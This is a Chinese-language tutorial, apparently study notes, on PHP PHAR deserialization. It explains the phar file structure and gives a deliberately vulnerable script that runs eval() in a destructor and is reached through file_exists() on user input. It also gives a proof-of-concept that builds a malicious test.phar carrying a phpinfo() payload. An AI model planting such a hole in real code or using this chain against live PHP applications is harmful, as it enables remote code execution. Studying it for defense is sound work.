[TOC]



# ==PHAR反序列化漏洞==

## 一、PHAR反序列化

PHAR指("Php ARchive”)是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像java -样方便地实现应用程序打包和组件化。一个应用程序可以打成一个Phar 包，直接放到 PHP-FPM 中运行。

我们一般利用反序列漏洞，一般都是借助unserialize()函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在2018年8月份的Blackhat2018大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:/ 伪协议读取phar文件时，会反序列化meta-data储存的信息。

## 二、PHAR文件结构

### 1、stub

stub的基本结构: `xxxx<?php __HALT_COMPILER();?>`前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。

### 2、meta-data

phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反席列化漏洞点。

### 3、content

被压缩文件的内容。

### 4、signature

签名，放在文件末尾。

## 三、PHAR工作原理

1、php.ini 中修改 phar.readonly = Off 并重启

![image-20240905144635297](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240905144635297.png)

![image-20240905145826420](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240905145826420.png)

2、编写以下PHP代码并命名为phar.php

当执行 `file_exists($filname)` 这句代码时，会自动进行序列值的反序列化

```php
<?php
//正常的PHP后台执行代码，注意需要使用file_exists函数触发
class User {
    var $name;
    function __destruct(){
        @eval($this->name);
        //echo $this->name;
    }
}
$filname = $_GET['filename'];
file_exists($filname);
?>
```

3、编写test.phar的POC并命名为pharpoc.php

```php
<?php

class User {
    var $name;
    public function __construct()
    {
        $this->name = "phpinfo();";
    }
}

@unlink("test.phar");  #如果已经存在 test.phar 文件，则删除该文件
$phar = new Phar("test.phar");  //然后重新创建一个Phar的文件对象，并命名为 test.phar 
$phar->startBuffering();  // 开启
$phar->setStub("<?php __HALT_COMPILER(); ?>");  //插入标志语,，用于标志这是一个phar文件
$o = new User();
$phar->setMetadata($o);  // 自己定义除文件信息之外的的需要被序列化的值，这一步会自动执行序列化操作
$phar->addFromString("test.txt","content");  //给test.phar 文件下添加文件test.txt
$phar->stopBuffering();

?>
```

4、访问第三步的pharpoc.php生成test.phar文件，再访问phar.php

访问pharpoc.php生成test.phar文件

![image-20240905160325133](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240905160325133.png)

再访问phar.php

![image-20240905160352252](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240905160352252.png)

5、以下函数可用于触发反序列化

![image-20240905151401577](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240905151401577.png)

## 四、利用PHAR绕过文件上传检测

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240905160820528.png" alt="image-20240905160820528" style="zoom:150%;" />